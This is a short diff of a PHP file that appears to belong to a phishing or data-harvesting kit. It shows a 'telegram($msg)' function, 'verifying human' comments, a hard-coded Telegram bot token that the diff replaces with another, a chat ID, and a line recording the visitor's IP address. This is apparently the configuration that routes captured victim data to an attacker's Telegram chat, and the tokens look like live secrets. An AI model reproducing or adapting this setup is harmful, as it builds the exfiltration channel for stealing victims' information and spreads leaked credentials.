@@ -10,7 +10,7 @@ function telegram($msg) {
 }
 //verifying human\\
 //required control\\
-$telegrambot = '5223962139:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o';
+$telegrambot = '5223962139:AAEflmK5DaL8SHvnTPsMAD-2Bm4w7p1XabQ';
 $telegramchatid = 1528668410; 
 
 $ip=$_SERVER['REMOTE_ADDR']; 
